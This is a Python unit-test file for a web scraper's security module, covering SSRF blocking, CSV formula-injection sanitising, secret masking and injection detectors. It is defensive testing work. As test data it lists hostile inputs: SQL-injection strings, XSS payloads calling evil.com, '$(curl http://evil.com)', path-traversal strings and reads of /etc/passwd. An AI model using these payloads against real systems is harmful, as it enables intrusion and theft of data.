"""
Unit & Edge Case Tests for scraper/security.py
Validates SSRF protection, CSV formula injection defense, and secret masking.
"""

import sys
import unittest
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

from scraper.models import ProductRecord
from scraper.security import (
    SecurityThreatError,
    detect_command_injection,
    detect_nosql_injection,
    detect_path_traversal,
    detect_sql_injection,
    detect_xss,
    inspect_security_threats,
    is_safe_url,
    mask_secret,
    sanitize_csv_cell,
    sanitize_threat_string,
)


class TestSecurity(unittest.TestCase):

    # -------------------------------------------------------------------------
    # 1. SSRF Protection Tests (is_safe_url)
    # -------------------------------------------------------------------------
    def test_safe_public_urls(self):
        safe_urls = [
            "https://se-fa.mitsubishielectric.com/fa/se_en/support/product-life-cycle-stage-eol",
            "https://mall.industry.siemens.com/mall/en/ww/Catalog/Products/1000000",
            "https://www.cisco.com/c/en/us/products/eos-eol-listing.html",
            "http://example.com/support/lifecycle"
        ]
        for url in safe_urls:
            with self.subTest(url=url):
                self.assertTrue(is_safe_url(url), f"Should allow public safe URL: {url}")

    def test_reject_private_and_loopback_ips(self):
        blocked_ips = [
            "http://127.0.0.1:8000/admin",
            "http://127.0.0.2/test",
            "http://10.0.0.1/secrets",
            "http://10.254.254.254/vault",
            "http://172.16.0.1/internal",
            "http://172.31.255.255/conf",
            "http://192.168.1.1/router",
            "http://192.168.0.100/api",
            "http://169.254.169.254/latest/meta-data/",  # Cloud Metadata Endpoint
            "http://[::1]:8080/admin",
            "http://2130706433:8000/",   # Decimal encoded loopback (127.0.0.1)
            "http://0x7f000001/admin",   # Hex encoded loopback (127.0.0.1)
            "http://0.0.0.0:8000/",       # Unspecified IPv4
            "http://[::]:8000/"          # Unspecified IPv6
        ]
        for url in blocked_ips:
            with self.subTest(url=url):
                self.assertFalse(is_safe_url(url), f"Should block private/internal IP: {url}")

    def test_reject_internal_hostnames(self):
        blocked_hostnames = [
            "http://localhost:8000/",
            "http://localhost/admin",
            "http://metadata/computeMetadata/v1/",
            "http://instance-data/latest/"
        ]
        for url in blocked_hostnames:
            with self.subTest(url=url):
                self.assertFalse(is_safe_url(url), f"Should block internal hostname: {url}")

    def test_reject_non_http_schemes(self):
        blocked_schemes = [
            "ftp://files.example.com/dump.zip",
            "file:///etc/passwd",
            "file:///sys/kernel/security",
            "gopher://127.0.0.1:70/",
            "data:text/html,<script>alert(1)</script>",
            "javascript:alert(1)"
        ]
        for url in blocked_schemes:
            with self.subTest(url=url):
                self.assertFalse(is_safe_url(url), f"Should block non-http scheme: {url}")

    def test_allowed_domains_enforcement(self):
        whitelist = ["mitsubishielectric.com", "siemens.com"]
        self.assertTrue(is_safe_url("https://mitsubishielectric.com/support", allowed_domains=whitelist))
        self.assertTrue(is_safe_url("https://se-fa.mitsubishielectric.com/eol", allowed_domains=whitelist))
        self.assertTrue(is_safe_url("https://mall.industry.siemens.com/catalog", allowed_domains=whitelist))
        # Unauthorized domain outside whitelist
        self.assertFalse(is_safe_url("https://malicious-site.com/eol", allowed_domains=whitelist))
        self.assertFalse(is_safe_url("https://fake-mitsubishielectric.com.evil.com", allowed_domains=whitelist))

    def test_invalid_url_edge_cases(self):
        self.assertFalse(is_safe_url(None))
        self.assertFalse(is_safe_url(""))
        self.assertFalse(is_safe_url("   "))
        self.assertFalse(is_safe_url("not_a_valid_url"))
        self.assertFalse(is_safe_url("http:///"))  # Missing hostname

    # -------------------------------------------------------------------------
    # 2. CSV Formula Injection Defense (sanitize_csv_cell)
    # -------------------------------------------------------------------------
    def test_sanitize_csv_formula_injection(self):
        malicious_inputs = [
            "=SUM(A1:A10)",
            "+CMD('calc')",
            "-2+3*4",
            "@HYPERLINK('http://evil.com')",
            "\t=1+1",
            "\r=cmd.exe"
        ]
        for item in malicious_inputs:
            sanitized = sanitize_csv_cell(item)
            with self.subTest(item=item):
                self.assertTrue(sanitized.startswith("'"), f"Dangerous formula character should be prefixed with single quote: {sanitized}")

    def test_sanitize_csv_cell_clean_inputs(self):
        self.assertEqual(sanitize_csv_cell("Mitsubishi Electric"), "Mitsubishi Electric")
        self.assertEqual(sanitize_csv_cell("MI3321G-W"), "MI3321G-W")
        self.assertEqual(sanitize_csv_cell("End of Life (EOL)"), "End of Life (EOL)")
        self.assertEqual(sanitize_csv_cell(None), "")
        self.assertEqual(sanitize_csv_cell(""), "")
        self.assertEqual(sanitize_csv_cell(12345), "12345")

    # -------------------------------------------------------------------------
    # 3. Secret Masking Tests (mask_secret)
    # -------------------------------------------------------------------------
    def test_mask_secret(self):
        self.assertEqual(mask_secret(None), "********")
        self.assertEqual(mask_secret(""), "********")
        self.assertEqual(mask_secret("short"), "********")
        # Normal API key format: keep first 4 and last 4
        masked = mask_secret("AIzaSyAbc1234567890Xyz")
        self.assertTrue(masked.startswith("AIza****"))
        self.assertTrue(masked.endswith("0Xyz"))
        self.assertNotIn("123456789", masked)

    # -------------------------------------------------------------------------
    # 4. SQL Injection Threat Tests
    # -------------------------------------------------------------------------
    def test_sql_injection_detection(self):
        sqli_attacks = [
            "' OR '1'='1",
            "admin'--",
            "1756-L71' UNION SELECT 1, 2, 3--",
            "model; DROP TABLE products;",
            "model; EXEC xp_cmdshell('whoami');",
            "test' AND SLEEP(5)--",
            "1' OR 'a'='a",
            "1'; WAITFOR DELAY '0:0:5'--",
            "test' OR 1=1",
            "val'; DELETE FROM vendor_records; --",
        ]
        for attack in sqli_attacks:
            with self.subTest(attack=attack):
                detected, desc = detect_sql_injection(attack)
                self.assertTrue(detected, f"Failed to detect SQLi attack: {attack}")
                self.assertIsNotNone(desc)

    def test_sql_injection_zero_false_positives_on_legit_models(self):
        legit_models = [
            "GT25-WLAN",
            "IR1101/K9",
            "CPU:214-1AD23",
            "6ES7511-1AK02-0AB0",
            "PowerEdge R740+",
            "Allen & Bradley (1756)",
            "MELSEC-Q Series",
            "Delivery Release (Lieferfreigabe)",
            "Phase-Out Product",
            "End of Life",
            "Discontinued - Successor: GT27-WLAN",
            "SIMATIC S7-1500",
            "FX5-EIP-CALC",
            "1769-L33ER",
        ]
        for model in legit_models:
            with self.subTest(model=model):
                detected, desc = detect_sql_injection(model)
                self.assertFalse(detected, f"False positive SQLi flagged on legitimate model: {model} ({desc})")

    # -------------------------------------------------------------------------
    # 5. XSS Threat Tests
    # -------------------------------------------------------------------------
    def test_xss_detection(self):
        xss_attacks = [
            "<script>alert('xss')</script>",
            "<script src='http://evil.com/x.js'></script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "<svg onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
        ]
        for attack in xss_attacks:
            with self.subTest(attack=attack):
                detected, desc = detect_xss(attack)
                self.assertTrue(detected, f"Failed to detect XSS attack: {attack}")
                self.assertIsNotNone(desc)

    # -------------------------------------------------------------------------
    # 6. Path Traversal & Command Injection Tests
    # -------------------------------------------------------------------------
    def test_path_traversal_detection(self):
        traversals = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\cmd.exe",
            "file.txt; /etc/shadow",
            "..%2f..%2fetc%2fpasswd",
        ]
        for attack in traversals:
            with self.subTest(attack=attack):
                detected, desc = detect_path_traversal(attack)
                self.assertTrue(detected, f"Failed to detect Path Traversal attack: {attack}")

    def test_command_injection_detection(self):
        cmd_injections = [
            "param && whoami",
            "model | dir",
            "$(curl http://evil.com)",
            "`whoami`",
            "test; cat /etc/passwd",
        ]
        for attack in cmd_injections:
            with self.subTest(attack=attack):
                detected, desc = detect_command_injection(attack)
                self.assertTrue(detected, f"Failed to detect Command Injection attack: {attack}")

    def test_nosql_injection_detection(self):
        nosql_payloads = [
            '{"$gt": ""}',
            "user[$ne]=1",
            "item[$regex]=.*",
        ]
        for attack in nosql_payloads:
            with self.subTest(attack=attack):
                detected, desc = detect_nosql_injection(attack)
                self.assertTrue(detected, f"Failed to detect NoSQL injection: {attack}")

    # -------------------------------------------------------------------------
    # 7. Comprehensive Inspector & Sanitizer
    # -------------------------------------------------------------------------
    def test_inspect_security_threats(self):
        # Threat detected
        is_th, th_type, reason = inspect_security_threats("test' OR 1=1 --", field_name="search")
        self.assertTrue(is_th)
        self.assertEqual(th_type, "SQL_INJECTION")
        self.assertIsNotNone(reason)

        # Raise error mode
        with self.assertRaises(SecurityThreatError):
            inspect_security_threats("<script>alert(1)</script>", field_name="model", raise_error=True)

        # Clean string passes
        is_th, th_type, reason = inspect_security_threats("SIMATIC S7-1500 CPU 1511-1 PN", field_name="model")
        self.assertFalse(is_th)
        self.assertIsNone(th_type)
        self.assertIsNone(reason)

    def test_sanitize_threat_string(self):
        dirty = "<script>alert(1)</script>SIMATIC S7-1500; cat /etc/passwd"
        cleaned = sanitize_threat_string(dirty)
        self.assertNotIn("<script>", cleaned)
        self.assertIn("SIMATIC S7-1500", cleaned)

    # -------------------------------------------------------------------------
    # 8. ProductRecord Model Security Validation
    # -------------------------------------------------------------------------
    def test_product_record_rejects_sql_injection(self):
        with self.assertRaises(ValueError):
            ProductRecord(
                vendor_name="Siemens",
                model_name="6ES7' OR '1'='1",
                status="Phase-Out",
                stage_date_utc="2025-01-01T00:00:00Z"
            )

    def test_product_record_rejects_xss_in_status(self):
        with self.assertRaises(ValueError):
            ProductRecord(
                vendor_name="Siemens",
                model_name="6ES7511-1AK02-0AB0",
                status="<script>alert(1)</script>",
                stage_date_utc="2025-01-01T00:00:00Z"
            )

    def test_product_record_rejects_command_injection_in_vendor(self):
        with self.assertRaises(ValueError):
            ProductRecord(
                vendor_name="Siemens && whoami",
                model_name="6ES7511-1AK02-0AB0",
                status="Phase-Out",
                stage_date_utc="2025-01-01T00:00:00Z"
            )


if __name__ == "__main__":
    unittest.main()
